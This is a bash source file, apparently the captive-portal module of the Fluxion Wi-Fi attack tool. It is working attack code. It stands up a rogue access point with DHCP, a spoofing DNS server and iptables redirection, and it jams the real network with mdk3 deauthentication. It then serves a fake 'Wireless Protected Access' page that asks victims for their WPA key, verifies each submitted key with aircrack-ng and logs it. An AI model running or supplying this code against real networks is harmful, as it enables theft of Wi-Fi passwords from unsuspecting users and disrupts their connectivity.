#!/bin/bash

############################# < Captive Portal Parameters > ############################
CaptivePortalState="Not Ready"

CaptivePortalPassLog="$FLUXIONPath/attacks/Captive Portal/pwdlog"
CaptivePortalNetLog="$FLUXIONPath/attacks/Captive Portal/netlog"
CaptivePortalJamTime="9999999999999"

CaptivePortalAuthenticationMethods=("hash") # "wpa_supplicant")
CaptivePortalAuthenticationMethodsInfo=("(handshake file, ${CGrn}recommended$CClr)") # "(Target AP authentication, slow)")

########################### < Virtual Network Configuration > ##########################
# To avoid collapsing with an already connected network, we'll use an uncommon network.
VIGWAddress="192.168.254.1"
VIGWNetwork=${VIGWAddress%.*}

function captive_portal_unset_auth() {
	if [ ! "$APRogueAuthMode" ]; then return 0; fi

	if [ "$APRogueAuthMode" = "hash" ]; then
		unset_hash
	fi

	APRogueAuthMode=""

	# If we've only got one option, then the user skipped this
	# section by taking that one option, so we unset the previous
	# phase along with this one to take the user properly back.
	if [ ${#CaptivePortalAuthenticationMethods[@]} -le 1 ]; then
		unset_ap_service
	fi
}

function captive_portal_set_auth() {
	if [ "$APRogueAuthMode" ]; then
		echo "Captive Portal authentication mode is already set, skipping!" > $FLUXIONOutputDevice
		return 0;
	fi

	captive_portal_unset_auth

	if [ ${#CaptivePortalAuthenticationMethods[@]} -eq 1 -o \
		 ${#CaptivePortalAuthenticationMethods[@]} -ge 1 -a "$FLUXIONAuto" ]; then
		APRogueAuthMode="${CaptivePortalAuthenticationMethods[0]}"
	else
		fluxion_header

		echo -e "$FLUXIONVLine $CaptivePortalVerificationMethodQuery"
		echo

		view_target_ap_info

		local choices=("${CaptivePortalAuthenticationMethods[@]}" "$FLUXIONGeneralBackOption")
		io_query_format_fields "" "\t$CRed[$CYel%d$CRed]$CClr %b %b\n" choices[@] \
										CaptivePortalAuthenticationMethodsInfo[@]

		echo

		APRogueAuthMode="${IOQueryFormatFields[0]}"

		if [[ "$APRogueAuthMode" = "$FLUXIONGeneralBackOption" ]]; then
			unset_ap_service
			captive_portal_unset_auth
			return 1
		fi
	fi

	if [ "$APRogueAuthMode" = "hash" ]; then
		set_hash
	fi

	if [[ $? -ne 0 ]]; then captive_portal_unset_auth; return 1; fi
}

function captive_portal_run_certificate_generator() {
	xterm -bg "#000000" -fg "#CCCCCC" -title "Generating Self-Signed SSL Certificate" -e openssl req -subj '/CN=captive.router.lan/O=CaptivePortal/OU=Networking/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout "$FLUXIONWorkspacePath/server.pem" -out "$FLUXIONWorkspacePath/server.pem" # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
	chmod 400 "$FLUXIONWorkspacePath/server.pem"
}

function captive_portal_unset_cert() {
	sandbox_remove_workfile "$FLUXIONWorkspacePath/server.pem"
}

# Create Self-Signed SSL Certificate
function captive_portal_set_cert() {
	# Check existance of ssl certificate with file size > 0
	if [ -f "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" -a \
		 -s "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" ]; then
		cp "$FLUXIONPath/attacks/Captive Portal/certificate/server.pem" \
		   "$FLUXIONWorkspacePath/server.pem"
	fi

	# Check existance of ssl certificate with file size > 0
	if [ -f "$FLUXIONWorkspacePath/server.pem" -a -s "$FLUXIONWorkspacePath/server.pem" ]; then
		echo "Captive Portal certificate is already set, skipping!" > $FLUXIONOutputDevice
		return 0;
	fi

	captive_portal_unset_cert

	if [ "$FLUXIONAuto" ]; then
		captive_portal_run_certificate_generator
	else
		local choices=("$CaptivePortalCertificateSourceGenerateOption" "$CaptivePortalCertificateSourceRescanOption" "$FLUXIONGeneralBackOption")

		while [ ! -f "$FLUXIONWorkspacePath/server.pem" -o ! -s "$FLUXIONWorkspacePath/server.pem" ]; do
			io_query_choice "$CaptivePortalCertificateSourceQuery" choices[@]

			echo

			case "$IOQueryChoice" in
				"$CaptivePortalCertificateSourceGenerateOption") captive_portal_run_certificate_generator; break;;
				"$CaptivePortalCertificateSourceRescanOption") return 2;;
				"$FLUXIONGeneralBackOption")
					captive_portal_unset_auth
					captive_portal_unset_cert
					return 1;;
				*) conditional_bail; return 3;;
			esac
		done
	fi
}


function captive_portal_unset_site() {
	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
}

function captive_portal_set_site() {
	if [ -d "$FLUXIONWorkspacePath/captive_portal" ]; then
		echo "Captive Portal site (interface) is already set, skipping!" > $FLUXIONOutputDevice
		return 0;
	fi

	captive_portal_unset_site

	local sites=()

	# Attempt adding only if the directory exists.
	if [ -d attacks/Captive\ Portal/generic/languages ]; then
		# Retrieve all generic sites available.
		for site in attacks/Captive\ Portal/generic/languages/*.lang; do
			sites+=("${CaptivePortalGenericInterfaceOption}_`basename "${site%.lang}"`")
		done
	fi

	# Attempt adding only if the directory exists.
	if [ -d attacks/Captive\ Portal/sites ]; then
		# Retrieve all available portal sites and
		# store them without the .portal extension.
		for site in attacks/Captive\ Portal/sites/*.portal; do
			sites+=("`basename "${site%.portal}"`")
		done
	fi

	local sitesIdentifier=("${sites[@]/_*/}" "$FLUXIONGeneralBackOption")
	local sitesLanguage=("${sites[@]/*_/}")

	format_center_dynamic "$CRed[$CYel%02d$CRed]$CClr %-44b $CBlu%10s$CClr"
	local queryFieldOptionsFormat=$FormatCenterDynamic

	fluxion_header

	echo -e "$FLUXIONVLine $CaptivePortalInterfaceQuery"

	echo

	view_target_ap_info

	io_query_format_fields "" "$queryFieldOptionsFormat\n" \
						   sitesIdentifier[@] sitesLanguage[@]

	echo

	local site="${IOQueryFormatFields[0]}"
	local siteLanguage="${IOQueryFormatFields[1]}"
	local sitePath="${site}_${siteLanguage}"

	case "$site" in
		"$CaptivePortalGenericInterfaceOption")
			source "$FLUXIONPath/attacks/Captive Portal/generic/languages/$siteLanguage.lang"
			captive_portal_generic;;
		"$FLUXIONGeneralBackOption")
			captive_portal_unset_cert
			captive_portal_unset_site
			return 1;;
		* )
			cp -r "$FLUXIONPath/attacks/Captive Portal/sites/$sitePath.portal" \
				  "$FLUXIONWorkspacePath/captive_portal"

			find "$FLUXIONWorkspacePath/captive_portal/" -type f -exec sed -i -e 's/$APTargetSSID/'"${APTargetSSID//\//\\\/}"'/g; s/$APTargetMAC/'"${APTargetMAC//\//\\\/}"'/g; s/$APTargetChannel/'"${APTargetChannel//\//\\\/}"'/g' {} \;;;
	esac
}

function captive_portal_unset_attack() {
	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
	sandbox_remove_workfile "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"
	sandbox_remove_workfile "$FLUXIONWorkspacePath/lighttpd.conf"
	sandbox_remove_workfile "$FLUXIONWorkspacePath/dhcpd.leases"
	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal/check.php"
	sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"

	# Only reset the AP if one has been defined.	
	if [ $(type -t ap_reset) ]; then
		ap_reset
	fi
}

# Create different settings required for the script
function captive_portal_set_attack() {
	# AP Service: Prepare service for an attack.
	ap_prep

	# Add the PHP authenticator scripts, used to verify
	# password attempts from users using the web interface.
	local authenticatorFiles=("authenticator.php" "check.php" "update.php")

	for authenticatorFile in "${authenticatorFiles[@]}"; do
		cp "$FLUXIONPath/attacks/Captive Portal/lib/$authenticatorFile" \
			"$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
		sed -i -e 's/\$FLUXIONWorkspacePath/'"${FLUXIONWorkspacePath//\//\\\/}"'/g' \
			"$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
		chmod u+x "$FLUXIONWorkspacePath/captive_portal/$authenticatorFile"
	done

	# Generate the dhcpd configuration file, which is
	# used to provide DHCP service to APRogue clients.
	echo "\
authoritative;

default-lease-time 600;
max-lease-time 7200;

subnet $VIGWNetwork.0 netmask 255.255.255.0 {
	option broadcast-address $VIGWNetwork.255;
	option routers $VIGWAddress;
	option subnet-mask 255.255.255.0;
	option domain-name-servers $VIGWAddress;

	range $VIGWNetwork.100 $VIGWNetwork.254;
}\
" > "$FLUXIONWorkspacePath/dhcpd.conf"

	#create an empty leases file
	touch "$FLUXIONWorkspacePath/dhcpd.leases"

	# Generate configuration for a lighttpd web-server.
	echo "\
server.document-root = \"$FLUXIONWorkspacePath/captive_portal/\"

server.modules = (
	\"mod_access\",
	\"mod_alias\",
	\"mod_accesslog\",
	\"mod_fastcgi\",
	\"mod_redirect\",
	\"mod_rewrite\"
)

fastcgi.server = (
	\".php\" => (
		(
			\"bin-path\" => \"/usr/bin/php-cgi\",
			\"socket\" => \"/php.socket\"
		)
	)
)

server.port = 80
server.pid-file = \"/var/run/lighttpd.pid\"
# server.username = \"www\"
# server.groupname = \"www\"

mimetype.assign = (
	\".html\" => \"text/html\",
	\".htm\" => \"text/html\",
	\".txt\" => \"text/plain\",
	\".jpg\" => \"image/jpeg\",
	\".png\" => \"image/png\",
	\".css\" => \"text/css\"
)


server.error-handler-404 = \"/\"

static-file.exclude-extensions = (
	\".fcgi\",
	\".php\",
	\".rb\",
	\"~\",
	\".inc\"
)

index-file.names = (
	\"index.htm\",
	\"index.html\"
)

\$SERVER[\"socket\"] == \":443\" {
	ssl.engine                  = \"enable\"
	ssl.pemfile                 = \"$FLUXIONWorkspacePath/server.pem\"
}

#Redirect www.domain.com to domain.com
\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
    url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
}
" > "$FLUXIONWorkspacePath/lighttpd.conf"


	# Create a DNS service with python, forwarding all traffic to gateway. 
	echo "\
import socket

class DNSQuery:
  def __init__(self, data):
    self.data=data
    self.dominio=''

    tipo = (ord(data[2]) >> 3) & 15
    if tipo == 0:
      ini=12
      lon=ord(data[ini])
      while lon != 0:
        self.dominio+=data[ini+1:ini+lon+1]+'.'
        ini+=lon+1
        lon=ord(data[ini])

  def respuesta(self, ip):
    packet=''
    if self.dominio:
      packet+=self.data[:2] + \"\x81\x80\"
      packet+=self.data[4:6] + self.data[4:6] + '\x00\x00\x00\x00'
      packet+=self.data[12:]
      packet+='\xc0\x0c'
      packet+='\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04'
      packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
    return packet

if __name__ == '__main__':
  ip='$VIGWAddress'
  print 'pyminifakeDwebconfNS:: dom.query. 60 IN A %s' % ip

  udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udps.bind(('',53))

  try:
    while 1:
      data, addr = udps.recvfrom(1024)
      p=DNSQuery(data)
      udps.sendto(p.respuesta(ip), addr)
      print 'Request: %s -> %s' % (p.dominio, ip)
  except KeyboardInterrupt:
    print 'Finalizando'
    udps.close()\
" > "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"

	chmod +x "$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py"

	# Attack arbiter script
	echo "\
#!/bin/bash

function signal_stop_attack() {
	kill -s SIGABRT $$ # Signal STOP ATTACK
	handle_abort_authenticator
}

function handle_abort_authenticator() {
	AuthenticatorState=\"aborted\"
}

trap signal_stop_attack SIGINT SIGHUP
trap handle_abort_authenticator SIGABRT

echo > \"$FLUXIONWorkspacePath/candidate.txt\"
echo -n \"0\"> \"$FLUXIONWorkspacePath/hit.txt\"
echo > \"$FLUXIONWorkspacePath/wpa_supplicant.log\"

# Make console cursor invisible, cnorm to revert. 
tput civis
clear

m=0
h=0
s=0
i=0

AuthenticatorState=\"running\"

startTime=\$(date +%s)

while [ \$AuthenticatorState = \"running\" ]; do
	let s=\$(date +%s)-\$startTime

	d=\`expr \$s / 86400\`
	s=\`expr \$s % 86400\`
	h=\`expr \$s / 3600\`
	s=\`expr \$s % 3600\`
	m=\`expr \$s / 60\`
	s=\`expr \$s % 60\`

	if [ \"\$s\" -le 9 ]; then
		is=\"0\"
	else
		is=
	fi

	if [ \"\$m\" -le 9 ]; then
		im=\"0\"
	else
		im=
	fi

	if [ \"\$h\" -le 9 ]; then
		ih=\"0\"
	else
		ih=
	fi

	if [ -f \"$FLUXIONWorkspacePath/pwdattempt.txt\" -a -s \"$FLUXIONWorkspacePath/pwdattempt.txt\" ]; then
		# Assure we've got a directory to store pwd logs into.
		if [ ! -d \"$CaptivePortalPassLog\" ]; then
			mkdir -p \"$CaptivePortalPassLog\"
		fi

		# Save any new password attempt.
		cat \"$FLUXIONWorkspacePath/pwdattempt.txt\" >> \"$CaptivePortalPassLog/$APTargetSSID-$APTargetMAC.log\"

		# Clear logged password attempt.
		echo -n > \"$FLUXIONWorkspacePath/pwdattempt.txt\"
	fi
" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	if [ $APRogueAuthMode = "hash" ]; then
		echo "
	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
		# Check if we've got the correct password by looking for anything other than \"Passphrase not in\".
		if ! aircrack-ng -w \"$FLUXIONWorkspacePath/candidate.txt\" \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" | grep -qi \"Passphrase not in\"; then
			echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
			break
		else
			echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
		fi
	fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
		echo "
	wpa_passphrase \"$APTargetSSID\" \"\`cat \"$FLUXIONWorkspacePath/candidate.txt\"\`\" > \"$FLUXIONWorkspacePath/wpa_supplicant.conf\"
	wpa_supplicant -i \"$WIAccessPoint\" -c \"$FLUXIONWorkspacePath/wpa_supplicant.conf\" -f \"$FLUXIONWorkspacePath/wpa_supplicant.log\" &
	wpaSupplicantPID=\$!

	# Shitty design...
	sleep 5

	if [ -f \"$FLUXIONWorkspacePath/candidate_result.txt\" ]; then
		if grep -i 'WPA: Key negotiation completed' \"$FLUXIONWorkspacePath/wpa_supplicant.log\"; then
			echo \"2\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
			break
		else
			echo \"1\" > \"$FLUXIONWorkspacePath/candidate_result.txt\"
		fi
	fi" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	fi

	echo "
	DHCPClients=($(nmap -PR -sn -n -oG - $VIGWNetwork.100-110 2>&1 | grep Host))

	echo
	echo -e \"  ACCESS POINT:\"
	echo -e \"    SSID ...........: $CWht$APTargetSSID$CClr\"
	echo -e \"    MAC ............: $CYel$APTargetMAC$CClr\"
	echo -e \"    Channel ........: $CWht$APTargetChannel$CClr\"
	echo -e \"    Vendor .........: $CGrn${APTargetMaker:-UNKNOWN}$CClr\"
	echo -e \"    Runtime ........: $CBlu\$ih\$h:\$im\$m:\$is\$s$CClr\"
	echo -e \"    Attempts .......: $CRed\$(cat $FLUXIONWorkspacePath/hit.txt)$CClr\"
	echo -e \"    Clients ........: $CBlu\$(cat $FLUXIONWorkspacePath/clients.txt | grep DHCPACK | awk '{print \$5}' | sort| uniq | wc -l)$CClr\"
	echo
	echo -e \"  CLIENTS ONLINE:\"

	x=0
	for client in \"\${DHCPClients[@]}\"; do
		x=\$((\$x+1))

		ClientIP=\$(echo \$client| cut -d \" \" -f2)
		ClientMAC=\$(nmap -PR -sn -n \$ClientIP 2>&1 | grep -i mac | awk '{print \$3}' | tr [:upper:] [:lower:])

		if [ \"\$(echo \$ClientMAC| wc -m)\" != \"18\" ]; then
			ClientMAC=\"xx:xx:xx:xx:xx:xx\"
		fi

		ClientMID=\$(macchanger -l | grep \"\$(echo \"\$ClientMAC\" | cut -d \":\" -f -3)\" | cut -d \" \" -f 5-)

		if echo \$ClientMAC| grep -q x; then
			ClientMID=\"unknown\"
		fi

		ClientHostname=\$(grep \$ClientIP \"$FLUXIONWorkspacePath/clients.txt\" | grep DHCPACK | sort | uniq | head -1 | grep '(' | awk -F '(' '{print \$2}' | awk -F ')' '{print \$1}')

		echo -e \"    $CGrn \$x) $CRed\$ClientIP $CYel\$ClientMAC $CClr($CBlu\$ClientMID$CClr) $CGrn \$ClientHostname$CClr\"
	done

	echo -ne \"\033[K\033[u\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"


	if [ $APRogueAuthMode = "hash" ]; then
		echo "
	sleep 1" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
		echo "
	killall \$wpaSupplicantPID &> $FLUXIONOutputDevice
" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	fi

	echo "
done

if [ \$AuthenticatorState = \"aborted\" ]; then exit 1; fi

clear
echo \"1\" > \"$FLUXIONWorkspacePath/status.txt\"

# sleep 7
sleep 3

signal_stop_attack


# killall mdk3 &> $FLUXIONOutputDevice
# killall aireplay-ng &> $FLUXIONOutputDevice
# killall airbase-ng &> $FLUXIONOutputDevice
# kill \$(ps a | grep python | grep fluxion_captive_portal_dns.py | awk '{print \$1}') &> $FLUXIONOutputDevice
# killall hostapd &> $FLUXIONOutputDevice
# killall lighttpd &> $FLUXIONOutputDevice
# killall dhcpd &> $FLUXIONOutputDevice

# if [ \"$APRogueAuthMode\" = \"wpa_supplicant\" ]; then
#	killall wpa_supplicant &> $FLUXIONOutputDevice
# fi

# killall wpa_passphrase &> $FLUXIONOutputDevice

# Assure we've got a directory to store net logs into.
if [ ! -d \"$CaptivePortalNetLog\" ]; then
	mkdir -p \"$CaptivePortalNetLog\"
fi

echo \"
FLUXION $FLUXIONVersion

SSID: $APTargetSSID
BSSID: $APTargetMAC ($APTargetMaker)
Channel: $APTargetChannel
Security: $APTargetEncryption
Time: \$ih\$h:\$im\$m:\$is\$s
Password: \$(cat $FLUXIONWorkspacePath/candidate.txt)
\" >\"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log\"" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"


	if [ $APRogueAuthMode = "hash" ]; then
		echo "
aircrack-ng -a 2 -b $APTargetMAC -0 -s \"$FLUXIONWorkspacePath/$APTargetSSIDClean-$APTargetMAC.cap\" -w \"$FLUXIONWorkspacePath/candidate.txt\" && echo && echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log"$CClr"\"\
" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	elif [ $APRogueAuthMode = "wpa_supplicant" ]; then
		echo "
echo -e \"The password was saved in "$CRed"$CaptivePortalNetLog/$APTargetSSID-$APTargetMAC.log"$CClr"\"\
" >> "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"

	fi

	chmod +x "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
}

# Generate the contents for a generic web interface
function  captive_portal_generic() {
	if [ ! -d "$FLUXIONWorkspacePath/captive_portal" ]; then
		mkdir "$FLUXIONWorkspacePath/captive_portal"
	fi

	base64 -d "$FLUXIONPath/attacks/Captive Portal/generic/assets" > "$FLUXIONWorkspacePath/file.zip"

	unzip "$FLUXIONWorkspacePath/file.zip" -d "$FLUXIONWorkspacePath/captive_portal" &>$FLUXIONOutputDevice
	sandbox_remove_workfile "$FLUXIONWorkspacePath/file.zip"

	echo "\
<!DOCTYPE html>
<html>
	<head>
		<meta charset=\"UTF-8\">
		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

		<title>Wireless Protected Access: Verifying</title>

		<!-- Styles -->
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
	</head>
	<body>
		<!-- final page -->
		<div id=\"done\" data-role=\"page\" data-theme=\"a\">
			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
				<h3 style=\"text-align:center;\">$DIALOG_WEB_OK</h3>
			</div>
		</div>
	</body>
</html>" > "$FLUXIONWorkspacePath/captive_portal/final.html"

    echo "\
<!DOCTYPE html>
<html>
	<head>
		<meta charset=\"UTF-8\">
		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

		<title>Wireless Protected Access: Key Mismatch</title>

		<!-- Styles -->
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
		<script src=\"js/jquery.validate.min.js\"></script>
		<script src=\"js/additional-methods.min.js\"></script>
	</head>
	<body>
		<!-- Error page -->
		<div data-role=\"page\" data-theme=\"a\">
			<div data-role=\"main\" class=\"ui-content ui-body ui-body-b\" dir=\"$DIALOG_WEB_DIR\">
				<h3 style=\"text-align:center;\">$DIALOG_WEB_ERROR</h3>
				<a href=\"index.html\" class=\"ui-btn ui-corner-all ui-shadow\" onclick=\"location.href='index.html'\">$DIALOG_WEB_BACK</a>
			</div>
		</div>
	</body>
</html>" > "$FLUXIONWorkspacePath/captive_portal/error.html"

    echo "\
<!DOCTYPE html>
<html>
	<head>
		<meta charset=\"UTF-8\">
		<meta name=\"viewport\" content=\"width=device-width, height=device-height, initial-scale=1.0\">

		<title>Wireless Protected Access: Login</title>

		<!-- Styles -->
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/jquery.mobile-1.4.5.min.css\"/>
		<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\"/>

		<!-- Scripts -->
		<script src=\"js/jquery-1.11.1.min.js\"></script>
		<script src=\"js/jquery.mobile-1.4.5.min.js\"></script>
		<script src=\"js/jquery.validate.min.js\"></script>
		<script src=\"js/additional-methods.min.js\"></script>
	</head>
	<body>
		<!-- Main page -->
		<div data-role=\"page\" data-theme=\"a\">
			<div class=\"ui-content\" dir=\"$DIALOG_WEB_DIR\">
				<fieldset>
					<form id=\"loginForm\" class=\"ui-body ui-body-b ui-corner-all\" action=\"check.php\" method=\"POST\">
						</br>
						<div class=\"ui-field-contain ui-responsive\" style=\"text-align:center;\">
							<div><u>$APTargetSSID</u> ($APTargetMAC)</div>
							<!--<div>Channel: $APTargetChannel</div>-->
						</div>
						<div style=\"text-align:center;\">
							<br>
							<label>$DIALOG_WEB_INFO</label>
							<br>
						</div>
						<div class=\"ui-field-contain\">
							<label for=\"key1\">$DIALOG_WEB_INPUT</label>
							<input id=\"key1\" style=\"color:#333; background-color:#CCC\" data-clear-btn=\"true\" type=\"password\" value=\"\" name=\"key1\" maxlength=\"64\"/>
						</div>
						<input data-icon=\"check\" data-inline=\"true\" name=\"submitBtn\" type=\"submit\" value=\"$DIALOG_WEB_SUBMIT\"/>
					</form>
				</fieldset>
			</div>
		</div>

		<script src=\"js/main.js\"></script>

		<script>
			$.extend( $.validator.messages, {
				required: \"$DIALOG_WEB_ERROR_MSG\",
				maxlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MAX\" ),
				minlength: $.validator.format( \"$DIALOG_WEB_LENGTH_MIN\" )
			});
		</script>
	</body>
</html>" > "$FLUXIONWorkspacePath/captive_portal/index.html"
}

function captive_portal_unset_routes() {
	if [ -f "$FLUXIONWorkspacePath/iptables-rules" ];then
		iptables-restore < "$FLUXIONWorkspacePath/iptables-rules" &> $FLUXIONOutputDevice
		sandbox_remove_workfile "$FLUXIONWorkspacePath/iptables-rules"
	else
		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
	fi

	# Restore system's original forwarding state
	if [ -f "$FLUXIONWorkspacePath/ip_forward" ]; then
		sysctl -w net.ipv4.ip_forward=$(cat "$FLUXIONWorkspacePath/ip_forward") &> $FLUXIONOutputDevice
		sandbox_remove_workfile "$FLUXIONWorkspacePath/ip_forward"
	fi
}

# Set up DHCP / WEB server
# Set up DHCP / WEB server
function captive_portal_set_routes() {
	# Give an address to the gateway interface in the network.
	ifconfig $VIGW $VIGWAddress netmask 255.255.255.0

	# Add a route to the virtual gateway interface.
	route add -net $VIGWNetwork.0 netmask 255.255.255.0 gw $VIGWAddress

	# Save the system's routing state to restore later.
	cp "/proc/sys/net/ipv4/ip_forward" "$FLUXIONWorkspacePath/ip_forward"

	# Activate system IPV4 packet routing/forwarding.
	sysctl -w net.ipv4.ip_forward=1 &>$FLUXIONOutputDevice

	iptables-save > "$FLUXIONWorkspacePath/iptables-rules"

	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	iptables -P FORWARD ACCEPT

	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $VIGWAddress:80
	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $VIGWAddress:443
	iptables -A INPUT -p tcp --sport 443 -j ACCEPT
	iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
	iptables -t nat -A POSTROUTING -j MASQUERADE
}

function unprep_attack() {
	CaptivePortalState="Not Ready"
	captive_portal_unset_attack
	captive_portal_unset_site
	captive_portal_unset_cert
	captive_portal_unset_auth
	unset_ap_service
}

function prep_attack() {
	while true; do
		set_ap_service; 				if [ $? -ne 0 ]; then break; fi
		captive_portal_set_auth; 		if [ $? -ne 0 ]; then continue; fi
		captive_portal_set_cert; 		if [ $? -ne 0 ]; then continue; fi
		captive_portal_set_site; 		if [ $? -ne 0 ]; then continue; fi
		captive_portal_set_attack; 		if [ $? -ne 0 ]; then continue; fi
		CaptivePortalState="Ready"
		break
	done

	# Check for prep abortion.
	if [ "$CaptivePortalState" = "Not Ready" ]; then
		unprep_attack
		return 1;
	fi
}

function stop_attack() {
	# Attempt to find PIDs of any running authenticators.
	local authenticatorPID=$(ps a | grep -vE "xterm|grep" | grep captive_portal_authenticator.sh | awk '{print $1}')

	# Signal any authenticator to stop authentication loop.
	if [ "$authenticatorPID" ]; then kill -s SIGABRT $authenticatorPID; fi

	killall mdk3 &> $FLUXIONOutputDevice
	local FLUXIONJammer=$(ps a | grep -e "FLUXION AP Jammer" | awk '{print $1'})
	if [ "$FLUXIONJammer" ]; then
		kill $FLUXIONJammer &> $FLUXIONOutputDevice
	fi
	sandbox_remove_workfile "$FLUXIONWorkspacePath/mdk3_blacklist.lst"

	# Kill captive portal web server.
	if [ $CaptivePortalServerPID ]; then
		kill $CaptivePortalServerPID &> $FLUXIONOutputDevice
		CaptivePortalServerPID=""
	fi

	# Kill python DNS service if one is found.
	local FLUXIONDNS=$(ps a | grep -e "FLUXION AP DNS" | awk '{print $1'})
	if [ "$FLUXIONDNS" ]; then
		kill $FLUXIONDNS &> $FLUXIONOutputDevice
	fi

	# Kill DHCP service.
	local FLUXIONDHCP=$(ps a | grep -e "FLUXION AP DHCP" | awk '{print $1'})
	if [ "$FLUXIONDHCP" ]; then
		kill $FLUXIONDHCP &> $FLUXIONOutputDevice
	fi
	sandbox_remove_workfile "$FLUXIONWorkspacePath/clients.txt"

	captive_portal_unset_routes

	ap_stop
}

function start_attack() {
	if [ "$CaptivePortalState" = "Running" ]; then return 0; fi

	stop_attack

	echo -e "$FLUXIONVLine $CaptivePortalStaringAPServiceNotice"
	ap_start

	echo -e "$FLUXIONVLine $CaptivePortalStaringAPRoutesNotice"
	captive_portal_set_routes &
	sleep 3

    fuser -n tcp -k 53 67 80 443 &> $FLUXIONOutputDevice
    fuser -n udp -k 53 67 80 443 &> $FLUXIONOutputDevice

	echo -e "$FLUXIONVLine $CaptivePortalStartingDHCPServiceNotice"
	xterm -bg black -fg green $TOPLEFT -title "FLUXION AP DHCP Service" -e "dhcpd -d -f -lf \"$FLUXIONWorkspacePath/dhcpd.leases\" -cf \"$FLUXIONWorkspacePath/dhcpd.conf\" $VIGW 2>&1 | tee -a \"$FLUXIONWorkspacePath/clients.txt\"" &

	echo -e "$FLUXIONVLine $CaptivePortalStartingDNSServiceNotice"
    xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FLUXION AP DNS Service" -e "if type python2 >/dev/null 2>/dev/null; then python2 \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; else python \"$FLUXIONWorkspacePath/fluxion_captive_portal_dns.py\"; fi" &

	echo -e "$FLUXIONVLine $CaptivePortalStartingWebServiceNotice"
    lighttpd -f "$FLUXIONWorkspacePath/lighttpd.conf" &> $FLUXIONOutputDevice
	CaptivePortalServerPID=$!

	echo -e "$FLUXIONVLine $CaptivePortalStartingJammerServiceNotice"
    echo -e "$APTargetMAC" > "$FLUXIONWorkspacePath/mdk3_blacklist.lst"
    xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "FLUXION AP Jammer [mdk3]  $APTargetSSID" -e "mdk3 $WIMonitor d -c $APTargetChannel -b \"$FLUXIONWorkspacePath/mdk3_blacklist.lst\"" &

	echo -e "$FLUXIONVLine $CaptivePortalStartingAuthenticatorServiceNotice"
    xterm -hold $TOPRIGHT -bg "#000000" -fg "#CCCCCC" -title "FLUXION AP Authenticator" -e "$FLUXIONWorkspacePath/captive_portal_authenticator.sh" &
}

# FLUXSCRIPT END
